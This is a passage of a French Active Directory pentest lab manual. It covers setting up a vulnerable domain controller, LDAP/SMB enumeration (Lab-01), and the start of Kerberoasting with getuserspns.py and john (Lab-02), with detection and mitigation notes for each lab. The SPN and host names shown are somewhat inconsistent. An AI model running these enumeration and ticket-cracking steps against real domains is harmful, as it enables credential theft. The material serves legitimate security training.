setspn -A HTTP/web.lab.local LAB\svc_web

# ------------------------------------------------------------------
# Bloc 5 : verification des comptes crees et du SPN
# ------------------------------------------------------------------
Get-ADUser -Filter { SamAccountName -like "svc_web" -or SamAccountName -like "lab_user" } `
    -Properties SamAccountName, UserPrincipalName, Enabled, PasswordNeverExpires |
    Format-Table SamAccountName, UserPrincipalName, Enabled, PasswordNeverExpires -AutoSize

setspn -L LAB\svc_web
```

**Explication de la commande**

- `Import-Module ActiveDirectory` : charge le module PowerShell d'ActiveDirectory (installé avec les outils de gestion AD DS à la section 4).
- `ConvertTo-SecureString "... -AsPlainText -Force` : convertit un mot de passe en clair en objet sécurisé (`SecureString`) utilisable par les cmdlets AD.
- `New-ADUser` : crée un objet utilisateur dans Active Directory.
- `-Name` : nom d'affichage de l'objet dans l'annuaire.
- `-SamAccountName` : nom de connexion (pré-Windows 2000), utilisé pour l'authentification (ex. `LAB\svc_web`).
- `-UserPrincipalName` : nom principal utilisateur (ex. `svc_web@LAB.local`, format adresse e-mail).
- `-AccountPassword` : mot de passe du compte, passé sous forme de `SecureString`.
- `-Enabled:$true` : compte activé dès sa création.
- `-PasswordNeverExpires:$true` (svc_web) : le mot de passe du compte de service n'expire pas (évite les verrouillages en cours de lab) ; à ne pas faire en production.
- `-Path "CN=Users,DC=LAB,DC=local"` : conteneur où l'objet est créé (`CN=Users` par défaut).
- `setspn -A HTTP/web.lab.local LAB\svc_web` : ajoute le Service Principal Name `HTTP/web.lab.local` au compte `svc_web` ; ce SPN rend le compte vulnérable au Kerberoasting (tout utilisateur de domaine authentifié peut demander un ticket TGS pour ce SPN).
- `Get-ADUser -Filter ...` : vérifie la création des deux comptes et affiche leurs propriétés principales.
- `setspn -L LAB\svc_web` : liste les SPN enregistrés sur le compte `svc_web` ; doit contenir `HTTP/web.lab.local`.
- Piège courant : `New-ADUser` échoue si le module ActiveDirectory n'est pas importé ou si la session n'est pas ouverte avec un compte disposant des droits de création d'objets dans l'OU `CN=Users` (ici, `Administrateur` de domaine).

**Résultat attendu**

```text
SamAccountName UserPrincipalName        Enabled PasswordNeverExpires
-------------- -----------------        ------- --------------------
svc_web        svc_web@LAB.local        True    True
lab_user       lab_user@LAB.local       True    False
```

```text
Registered ServicePrincipalNames for CN=svc_web,CN=Users,DC=LAB,DC=local:
        HTTP/web.lab.local
```

Le compte `svc_web` dispose maintenant du SPN `HTTP/web.lab.local`, exploité au Lab-02 pour le Kerberoasting. Le compte `lab_user` (mot de passe `LabUser2024!`) constitue un point de départ utilisateur standard sur le domaine.

> **Note** : les noms de comptes et le SPN utilisés dans cette section sont ceux de l'installation de la cible. Les Labs 01 à 05 utilisent les identifiants décrits dans leurs propres énoncés ; adaptez les commandes des labs si vous créez des comptes aux noms différents.

**Preuve** : sortie du script PowerShell (création des comptes et liste des SPN) consignée dans `preuves/ch3-setup/comptes-ad.txt`.

### 8. Pare-feu Windows

**But** — autoriser le trafic nécessaire depuis Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102` : LDAP (389), LDAPS (636), Kerberos (88), DNS (53), SMB (445), RPC (135 et ports dynamiques), WinRM (5985).

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — contrôleur de domaine opérationnel, session `Administrateur` ouverte.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` | **Répertoire** : `C:\Users\Administrator`

**Exemple de commande** (règles de pare-feu par PowerShell) :

```powershell
# LDAP (389) et LDAPS (636)
New-NetFirewallRule -DisplayName "LDAP depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 389 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "LDAPS depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 636 -RemoteAddress 192.168.56.101 -Action Allow

# Kerberos (88) et kpasswd (464)
New-NetFirewallRule -DisplayName "Kerberos depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 88 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "Kerberos UDP depuis Kali" -Direction Inbound -Protocol UDP -LocalPort 88 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "kpasswd depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 464 -RemoteAddress 192.168.56.101 -Action Allow

# DNS (53)
New-NetFirewallRule -DisplayName "DNS depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 53 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "DNS UDP depuis Kali" -Direction Inbound -Protocol UDP -LocalPort 53 -RemoteAddress 192.168.56.101 -Action Allow

# SMB (445), RPC Endpoint Mapper (135) et NetBIOS (139)
New-NetFirewallRule -DisplayName "SMB depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 445 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "RPC Endpoint Mapper depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 135 -RemoteAddress 192.168.56.101 -Action Allow
New-NetFirewallRule -DisplayName "NetBIOS depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 139 -RemoteAddress 192.168.56.101 -Action Allow

# WinRM (5985)
New-NetFirewallRule -DisplayName "WinRM HTTP depuis Kali" -Direction Inbound -Protocol TCP -LocalPort 5985 -RemoteAddress 192.168.56.101 -Action Allow
```

**Explication de la commande**

- `New-NetFirewallRule` : crée une règle de pare-feu Windows Defender avec Advanced Security.
- `-DisplayName` : nom lisible de la règle (aide à l'identification et au nettoyage ultérieur).
- `-Direction Inbound` : filtre le trafic entrant vers le serveur.
- `-Protocol TCP` / `-Protocol UDP` : protocole transport concerné (Kerberos et DNS utilisent aussi l'UDP).
- `-LocalPort` : port d'écoute du service sur le serveur (389 LDAP, 636 LDAPS, 88 Kerberos, 464 kpasswd, 53 DNS, 445 SMB, 135 RPC, 139 NetBIOS, 5985 WinRM).
- `-RemoteAddress 192.168.56.101` : limite la règle à l'adresse IP de Kali (principe de moindre privilège, réseau de laboratoire uniquement).
- `-Action Allow` : autorise le trafic correspondant.
- Les ports RPC dynamiques (plage `49152-65535`) sont utilisés par les services DCOM/WMI ; dans le cadre des Labs 01 à 05, SMB (445) et LDAP (389) suffisent, la règle WinRM (5985) est incluse pour complétude.
- Piège courant : une règle trop large (`-RemoteAddress Any`) exposerait les services AD à tout le réseau ; restreindre à `192.168.56.101` respecte le périmètre du laboratoire isolé.

**Résultat attendu**

Chaque règle retourne un objet résumé, par exemple :

```text
Name                           : LDAP depuis Kali
DisplayName                    : LDAP depuis Kali
Description                    :
Enabled                        : True
Direction                      : Inbound
...
```

Vérification de l'ensemble des règles :

```powershell
Get-NetFirewallRule | Where-Object { $_.DisplayName -like "*depuis Kali*" } | Format-Table DisplayName, Direction, Protocol, LocalPort, RemoteAddress, Action -AutoSize
```

**Résultat attendu**

```text
DisplayName                   Direction Protocol LocalPort RemoteAddress Action
---------------------------   ---------- -------- --------- ------------- ------
LDAP depuis Kali              Inbound    TCP      389     192.168.56.101  Allow
LDAPS depuis Kali             Inbound    TCP      636     192.168.56.101  Allow
Kerberos depuis Kali          Inbound    TCP      88      192.168.56.101  Allow
Kerberos UDP depuis Kali      Inbound    UDP      88      192.168.56.101  Allow
kpasswd depuis Kali           Inbound    TCP      464     192.168.56.101  Allow
DNS depuis Kali               Inbound    TCP      53      192.168.56.101  Allow
DNS UDP depuis Kali           Inbound    UDP      53      192.168.56.101  Allow
SMB depuis Kali               Inbound    TCP      445     192.168.56.101  Allow
RPC Endpoint Mapper depuis Kali Inbound  TCP      135     192.168.56.101  Allow
NetBIOS depuis Kali           Inbound    TCP      139     192.168.56.101  Allow
WinRM HTTP depuis Kali        Inbound    TCP      5985    192.168.56.101  Allow
```

**Preuve** : sortie de `Get-NetFirewallRule` enregistrée dans `preuves/ch3-setup/firewall.txt`.

### 9. Snapshot propre

**But** — prendre un snapshot VirtualBox nommé `Ch3-Clean-AD` de Windows Server 2016 avant toute exploitation, afin de pouvoir restaurer l'environnement sain après Lab-05.

**Machine** — hôte VirtualBox (gestion des snapshots), pas de cible réelle.

**Prérequis** — Windows Server 2016 configuré (sections 1 à 8), VM éteinte ou en cours d'exécution (VirtualBox permet les snapshots à chaud ; éteinte est préférable pour un état propre).

> **Machine** : hôte VirtualBox | **Terminal** : invite de commandes ou PowerShell de l'hôte | **Utilisateur** : utilisateur de l'hôte | **Répertoire** : répertoire d'installation de VirtualBox

**Exemple de commande** (création du snapshot, depuis l'hôte) :

```bash
VBoxManage snapshot "Windows Server 2016" take "Ch3-Clean-AD" --description "Etat propre avant exploitation chapitre 3 (AD LAB.local, IP 192.168.56.102)"
```

**Explication de la commande**

- `VBoxManage` : interface en ligne de commande de VirtualBox (exécutée sur l'hôte, pas dans la VM).
- `snapshot "Windows Server 2016"` : cible la machine virtuelle nommée "Windows Server 2016" (adapter le nom si nécessaire).
- `take "Ch3-Clean-AD"` : crée un nouveau snapshot nommé `Ch3-Clean-AD`.
- `--description` : description du snapshot pour le distinguer dans l'interface VirtualBox.
- Ce snapshot capture l'état complet du disque (et de la mémoire si la VM est en cours) du contrôleur de domaine sain.
- Piège courant : le nom de la VM doit correspondre exactement à celui affiché dans VirtualBox (`VBoxManage list vms` pour vérifier) ; sinon `VBoxManage` renvoie `VBoxManage.exe: error: Cannot find a virtual machine ...`.

**Résultat attendu**

```text
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Snapshot taken successfully. UUID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**Preuve** : sortie de la commande consignée dans `preuves/ch3-setup/snapshot-ch3-clean-ad.txt` ; le snapshot est visible dans le gestionnaire VirtualBox sous le nom `Ch3-Clean-AD`.

**Rollback après Lab-05** (à exécuter depuis l'hôte à la fin du chapitre) :

```bash
VBoxManage snapshot "Windows Server 2016" restore "Ch3-Clean-AD"
VBoxManage startvm "Windows Server 2016" --type headless
```

Ce rollback remet le contrôleur de domaine dans son état sain (comptes de test tels que créés dans cette section, sans les modifications des Labs 01 à 05 : pas de `labadmin`, pas de changement de mot de passe de `svc_web`).

### 10. Vérification de fonctionnement

**But** — confirmer depuis Kali que le contrôleur de domaine `LAB.local` est pleinement opérationnel et accessible avant le premier lab d'attaque.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Windows Server 2016 démarré en contrôleur de domaine, pare-feu configure (section 8), fonction `prouve` chargée sur Kali (voir section 5.3 du chapitre).

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

#### Étape 10.1 — Scan des ports Active Directory depuis Kali

**But** — vérifier l'ouverture des ports AD depuis Kali.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — `nmap` installé sur Kali, fonction `prouve` chargée, cible joignable.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-setup/nmap-verification.txt nmap -p 88,135,389,445,464,636,3268,3269,5985 192.168.56.102
```

**Explication de la commande**

- `nmap -p 88,135,389,445,464,636,3268,3269,5985 192.168.56.102` : scan des ports typiques d'Active Directory depuis Kali : Kerberos (88), MSRPC (135), LDAP (389), SMB (445), kpasswd (464), LDAPS (636), Global Catalog (3268/3269), WinRM (5985).
- `-p` : liste explicite des ports à scanner (état ouvert/fermé seulement, sans détection de version).
- `192.168.56.102` : adresse IP du contrôleur de domaine Windows Server 2016.
- Piège courant : `nmap` sans privilèges root effectue un scan TCP connect (`-sT` implicite) ; certains ports peuvent apparaître `filtered` si le pare-feu Windows ne les a pas encore ouverts (vérifier la section 8).

**Résultat attendu**

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:00 CET
Nmap scan report for 192.168.56.102
Host is up (0.0018s latency).
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp   open  ldap
445/tcp  open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 5.12 seconds
```

**Preuve** : `preuves/ch3-setup/nmap-verification.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 10.2 — Interrogation LDAP anonyme du contexte de nommage

**But** — vérifier que le service LDAP répond et que le contexte de nommage `DC=LAB,DC=local` est présent.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — port LDAP 389 ouvert sur le DC (vérifié à l'étape 10.1), `ldapsearch` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-setup/ldap-verification.txt ldapsearch -x -h 192.168.56.102 -p 389 -s base '(objectClass=*)' namingContexts
```

**Explication de la commande**

- `ldapsearch -x -h 192.168.56.102 -p 389` : interrogation LDAP simple (pas de SASL) du serveur `192.168.56.102` sur le port 389.
- `-s base` : portée limitée à la racine de l'annuaire (DSE).
- `'(objectClass=*)' namingContexts` : retourne uniquement l'attribut `namingContexts`, qui liste les contextes de nommage du domaine (`DC=LAB,DC=local`, `CN=Configuration,...`, `CN=Schema,...`).
- Piège courant : si le LDAP anonyme est désactivé ou si le port 389 est filtré, la commande renvoie une erreur de connexion ; vérifier le pare-feu (section 8) et la promotion du contrôleur de domaine (section 5).

**Résultat attendu**

```text
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
#

dn:
namingContexts: DC=LAB,DC=local
namingContexts: CN=Configuration,DC=LAB,DC=local
namingContexts: CN=Schema,DC=LAB,DC=local

# search result
search: 2
result: 0 Success
```

**Preuve** : `preuves/ch3-setup/ldap-verification.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 10.3 — Vérification SMB avec NetExec

**But** — confirmer que le service SMB répond sur le contrôleur de domaine et identifier le système.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — `nxc` (NetExec) installé, cible joignable.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-setup/nxc-verification.txt nxc smb 192.168.56.102
```

**Explication de la commande**

- `nxc smb 192.168.56.102` : énumération SMB sans authentification (NetExec) pour confirmer que le service SMB répond et identifier le système (nom, domaine, build).
- Aucun identifiant n'est fourni ; NetExec tente une session nulle ou affiche les informations du serveur accessible.
- Piège courant : si SMB est signé ou si l'accès anonyme est restreint, la sortie peut être limitée ; cela n'empêche pas les Labs 01 à 05 qui s'authentifient avec des comptes de domaine.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WIN-SRV-2016  [*] Windows Server 2016 14391 build 14391 (x64) (name:WIN-SRV-2016) (domain:LAB.local) (signing:False) (SMBv1:False)
```

**Preuve** : `preuves/ch3-setup/nxc-verification.txt` (contient `# date:`, `# cmd:`, `# rc=`).

### Rattachement MITRE ATT&CK de cette section

Cette section est une **préparation de cible** : elle n'exécute aucune technique d'attaque MITRE ATT&CK. Elle met en place l'environnement sur lequel les Labs 01 à 05 s'appuient. La seule référence indicative est **T1087.002 (Domain Account Discovery)** : les comptes `svc_web` et `lab_user` créés ici seront découverts et énumérés depuis Kali au Lab-01 via LDAP ; cette section constitue donc le contexte cible, pas une technique offensive appliquée.

### Conclusion de la section

À l'issue de cette section, Windows Server 2016 `192.168.56.102` est installé, renommé `WIN-SRV-2016`, configuré en adresse IP statique `192.168.56.102/24`, promu contrôleur de domaine de la forêt `LAB.local` (NetBIOS `LAB`) avec service DNS, et peuplé des comptes de test `svc_web` (SPN `HTTP/web.lab.local`) et `lab_user`. Le pare-feu autorise le trafic AD depuis Kali `192.168.56.101`, et un snapshot `Ch3-Clean-AD` a été pris pour permettre le rollback après Lab-05. La vérification depuis Kali confirme l'ouverture des ports LDAP (389), Kerberos (88), SMB (445), DNS (53) et WinRM (5985).

L'environnement est prêt pour le premier lab d'attaque : **Lab-01 — Reconnaissance Active Directory et énumération LDAP**.

## Lab-01 — Reconnaissance Active Directory et énumération LDAP

### Énoncé / Contexte

Vous disposez de Kali (`192.168.56.101`) avec un compte utilisateur de domaine `labuser` (`LabUser2024!`) et de Windows Server 2016 `192.168.56.102`, contrôleur de domaine `LAB.local`. L'objectif est de produire une empreinte vérifiable de l'annuaire Active Directory : nom de contexte du domaine, comptes d'utilisateur, comptes de service portant des SPN (Service Principal Name) et politique de mots de passe du domaine. Aucun exploit n'est exécuté ici ; seule la reconnaissance et l'énumération sont réalisées.

**Place dans la chaîne** — première phase (Discovery). Les résultats alimentent Lab-02 (le SPN du compte `svc_web` découvert ici sert pour le Kerberoasting).

**MITRE ATT&CK de ce lab** — Tactique : Discovery (TA0007). Techniques : T1087.002 Domain Account Discovery, T1482 Domain Trust Discovery, T1018 Remote System Discovery. Sources de données : DS0026 Active Directory, DS0029 Network Traffic.

**Détection attendue** : événements LDAP sur le contrôleur de domaine, requêtes de naming context, interrogations répétées sur les objets utilisateur.

**Mitigation attendue** : signature et liaison de canal LDAP (LDAP signing / channel binding), désactivation de l'authentification anonyme LDAP, restriction des ports 389/3268 aux réseaux d'administration, surveillance des événements d'accès aux objets d'annuaire.

Durée estimée : 30 minutes.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `nmap` | `nmap -sT -p 53,88,135,138,139,389,445,464,3268,3269,3389 192.168.56.102` | Scan des ports Active Directory |
| `ldapsearch` | `ldapsearch -x -h ... -p 389 -s base ... namingContexts` | Récupération du contexte de nommage du domaine |
| `ldapsearch` | `ldapsearch -x -D 'CN=labuser,...' -w '...' -b 'DC=LAB,DC=local' ...` | Énumération des comptes et SPN avec un compte de domaine |
| `nxc` | `nxc ldap 192.168.56.102 -u labuser -p '...' --pass-pol` | Lecture de la politique de mots de passe via LDAP |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |

### Commande et laboratoire étape par étape

#### Étape 1 — Scan des ports Active Directory

**But** — identifier les services Active Directory exposés sur le contrôleur de domaine.

**Machine** — Kali `192.168.56.101` (attaquante) vers Windows Server 2016 `192.168.56.102` (cible).

**Prérequis** — Kali démarré sur `vboxnet0`, Windows Server 2016 démarré avec snapshot pris, `nmap` installé, fonction `prouve` chargée.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab01/nmap-ad.txt nmap -sT -p 53,88,135,138,139,389,445,464,3268,3269,3389 192.168.56.102
```

**Explication de la commande**

- `prouve` : journalise la commande avec `# date:`, `# cmd:`, capture `stdout` + `stderr` et écrit le code retour `# rc=` dans le fichier de preuve.
- `preuves/ch3-lab01/nmap-ad.txt` : fichier de preuve de l'étape ; il sera réutilisé au Lab-05 pour l'inventaire.
- `nmap -sT` : scan TCP complet (connect scan) ; utilisé ici car il ne nécessite pas les privilèges root, contrairement à `-sS`.
- `-p 53,88,135,138,139,389,445,464,3268,3269,3389` : liste des ports typiques d'Active Directory (DNS, Kerberos, MSRPC, NetBIOS, LDAP, SMB, kpasswd, Global Catalog).
- `192.168.56.102` : adresse IP du contrôleur de domaine Windows Server 2016.
- Piège courant : ne pas confondre l'absence de réponse d'un port avec l'absence du service ; un firewall peut filtrer sans rejeter.

**Résultat attendu**

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:00 CET
Nmap scan report for 192.168.56.102
Host is up (0.0018s latency).
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
```

**Preuve** : `preuves/ch3-lab01/nmap-ad.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 2 — Énumération du contexte de nommage LDAP (accès anonyme)

**But** — récupérer le `namingContexts` du domaine via une requête LDAP de base sur le port 389.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Port LDAP 389 ouvert sur le DC (vérifié à l'étape 1), `ldapsearch` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab01/ldap-base.txt ldapsearch -x -h 192.168.56.102 -p 389 -s base '(objectClass=*)' namingContexts
```

**Explication de la commande**

- `ldapsearch` : client LDAP en ligne de commande pour interroger l'annuaire Active Directory.
- `-x` : utilise une authentification simple (SASL désactivé) ; sans cette option, ldapsearch tente une authentification SASL externe qui peut échouer sur Windows.
- `-h 192.168.56.102` : adresse IP du serveur LDAP (contrôleur de domaine).
- `-p 389` : port LDAP classique ; le port 636 serait LDAPS (non utilisé ici en laboratoire).
- `-s base` : portée de recherche limitée à l'objet racine (DSE), suffisante pour lire `namingContexts`.
- `'(objectClass=*)'` : filtre LDAP qui correspond à tout objet ; requis par la syntaxe de la requête.
- `namingContexts` : seul cet attribut est demandé ; il retourne les contextes de nommage du domaine (`DC=LAB,DC=local`, `CN=Configuration,...`, `CN=Schema,...`).
- Piège courant : une recherche sans `-s base` retourne l'ensemble de l'arborescence et peut être très volumineuse.

**Résultat attendu**

```text
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
#

dn:
namingContexts: DC=LAB,DC=local
namingContexts: CN=Configuration,DC=LAB,DC=local
namingContexts: CN=Schema,DC=LAB,DC=local

# search result
search: 2
result: 0 Success
```

**Preuve** : `preuves/ch3-lab01/ldap-base.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 3 — Énumération des comptes et des SPN avec un compte utilisateur de domaine

**But** — lister les comptes d'utilisateur de domaine et identifier ceux qui portent un Service Principal Name (SPN), cibles potentielles du Kerberoasting.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Identifiants du compte `labuser` (`LabUser2024!`) valides sur le domaine `LAB.local`, LDAP 389 accessible.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab01/ldap-spn.txt ldapsearch -x -h 192.168.56.102 -p 389 -D 'CN=labuser,CN=Users,DC=LAB,DC=local' -w 'LabUser2024!' -b 'DC=LAB,DC=local' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName userPrincipalName
```

**Explication de la commande**

- `-D 'CN=labuser,CN=Users,DC=LAB,DC=local'` : nom distinctif (DN) du compte utilisé pour s'authentifier vers l'annuaire.
- `-w 'LabUser2024!'` : mot de passe du compte `labuser` passé en ligne de commande.
- `-b 'DC=LAB,DC=local'` : base de recherche ; toute la requête s'effectue dans ce contexte de nommage.
- `'(&(objectClass=user)(servicePrincipalName=*))'` : filtre LDAP combiné (ET) qui sélectionne les objets de classe `user` possédant un attribut `servicePrincipalName` non vide.
- `sAMAccountName servicePrincipalName userPrincipalName` : seuls ces trois attributs sont retournés pour chaque compte trouvé.
- Piège courant : le DN du compte doit correspondre exactement à l'organisation unitaire où le compte a été créé (`CN=Users` par défaut ici) ; sinon la requête renvoie `Inappropriate authentication` ou un résultat vide.

**Résultat attendu**

```text
# extended LDIF
#
# LDAPv3
# scope subtree
#

# svc_web, Users, LAB.local
dn: CN=svc_web,CN=Users,DC=LAB,DC=local
sAMAccountName: svc_web
userPrincipalName: svc_web@LAB.local
servicePrincipalName: HTTP/ws2016-dc.lab.local

# labuser, Users, LAB.local
dn: CN=labuser,CN=Users,DC=LAB,DC=local
sAMAccountName: labuser
userPrincipalName: labuser@LAB.local
servicePrincipalName:

# search result
search: 2
result: 0 Success
```

**Preuve** : `preuves/ch3-lab01/ldap-spn.txt` (contient `# date:`, `# cmd:`, `# rc=`). Ce fichier révèle le compte de service `svc_web` avec le SPN `HTTP/ws2016-dc.lab.local`, cible du Lab-02.

#### Étape 4 — Lecture de la politique de mots de passe du domaine

**But** — lire la stratégie de mots de passe d'Active Directory via LDAP pour évaluer la robustesse des comptes et justifier le verrouillage de compte.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Lab-01 étapes 1 à 3 terminées, identifiants `labuser` valides, `nxc` (NetExec) installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab01/pass-pol.txt nxc ldap 192.168.56.102 -u 'labuser' -p 'LabUser2024!' --pass-pol
```

**Explication de la commande**

- `nxc ldap` : module LDAP de NetExec pour interagir avec Active Directory depuis Kali.
- `192.168.56.102` : cible (contrôleur de domaine).
- `-u 'labuser'` : nom d'utilisateur du compte de domaine utilisé pour l'authentification LDAP.
- `-p 'LabUser2024!'` : mot de passe du compte `labuser`.
- `--pass-pol` : demande à NetExec de lire et d'afficher la politique de mots de passe du domaine (longueur minimale, complexité, verrouillage, historique).
- Piège courant : si la politique de verrouillage est active (`lockout threshold` faible), des tentatives répétées avec un mauvais mot de passe verrouillent le compte ; privilégier une authentification réussie unique, comme ici.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
LDAP        192.168.56.102:389    WS2016-DC  [*] LAB.local labuser:LabUser2024!
LDAP        192.168.56.102:389    WS2016-DC  [*] Password policy:
LDAP        192.168.56.102:389    WS2016-DC  [*]   lockout duration: 30
LDAP        192.168.56.102:389    WS2016-DC  [*]   lockout observation window: 30
LDAP        192.168.56.102:389    WS2016-DC  [*]   lockout threshold: 5
LDAP        192.168.56.102:389    WS2016-DC  [*]   min password length: 7
LDAP        192.168.56.102:389    WS2016-DC  [*]   password complexity: True
```

**Preuve** : `preuves/ch3-lab01/pass-pol.txt` (contient `# date:`, `# cmd:`, `# rc=`).

### En conclusion

Lab-01 a permis de cartographier l'annuaire Active Directory depuis l'extérieur du domaine : le contexte de nommage `DC=LAB,DC=local` est confirmé, les ports de services AD sont ouverts (LDAP 389, Kerberos 88, SMB 445, Global Catalog 3268), et l'énumération authentifiée a révélé le compte de service `svc_web` portant le SPN `HTTP/ws2016-dc.lab.local`. La politique de mots de passe indique un verrouillage après 5 échecs et une longueur minimale de 7 caractères.

Ces résultats constituent l'entrée de Lab-02 : le SPN découvert autorise une demande de ticket TGS pour `svc_web` (Kerberoasting). La détection se base sur les événements LDAP et d'accès aux objets d'annuaire du contrôleur de domaine ; la mitigation passe par LDAP signing/channel binding, la désactivation du LDAP anonyme et la surveillance des requêtes de naming context.

Le snapshot de Windows Server 2016 `192.168.56.102` doit rester intact ; il sera restauré (rollback) après Lab-05.

## Lab-02 — Kerberoasting (T1558.003) et crackage du ticket de service

### Énoncé / Contexte

S'appuyant sur Lab-01, ce lab démontre le Kerberoasting : un utilisateur de domaine authentifié peut demander des tickets TGS pour n'importe quel compte de service possédant un SPN. Le ticket TGS est chiffré avec la clé dérivée du mot de passe du compte de service ; une fois extrait, il peut être cracké hors ligne pour révéler le mot de passe du compte de service, sans interaction avec le contrôleur de domaine pendant le crackage.

**Place dans la chaîne** — utilise le SPN `HTTP/ws2016-dc.lab.local` du compte `svc_web` découvert au Lab-01 ; le mot de passe cracké alimente Lab-03 (Pass-the-Hash et exécution distante).

**MITRE ATT&CK de ce lab** — Tactique : Credential Access (TA0006). Techniques : T1558.003 Kerberoasting, T1110.002 Password Cracking. Sources de données : DS0026 Active Directory, DS0029 Network Traffic.

**Détection attendue** : événement Windows `4769` (demande de TGS) avec un volume anormal de TGS demandés par un même utilisateur et un chiffrement RC4 (`0x17`) ; compte de service demandeur inhabituel.

**Mitigation attendue** : mots de passe longs (≥ 25 caractères) ou comptes de service gérés (gMSA) pour les comptes avec SPN, chiffrement AES uniquement, suppression des SPN inutiles, surveillance du nombre de demandes TGS par utilisateur.

Durée estimée : 45 minutes.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `getuserspns.py` | `getuserspns.py 'LAB/labuser:...' -dc-ip 192.168.56.102 -request -outputfile ...` | Demande de tickets TGS et extraction du hachage Kerberoasting |
| `grep` | `grep -a '\$krb5tgs\$' ... > ...hash` | Isolation de la ligne de hachage TGS pour le crackage |
| `john` | `john --wordlist=... --format=krb5tgs ...hash` | Crackage hors ligne du hachage TGS |
| `nxc` | `nxc smb 192.168.56.102 -u svc_web -p '...' --shares` | Vérification du mot de passe cracké sur SMB |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |

### Commande et laboratoire étape par étape

#### Étape 1 — Demande de tickets TGS (Kerberoasting) avec getuserspns.py

**But** — demander des tickets TGS pour les comptes de service à SPN du domaine et extraire leur hachage au format crackable.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Lab-01 terminé (compte `labuser` validé, SPN de `svc_web` connu), `getuserspns.py` installé (paquet Impacket ; sinon `python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py`).

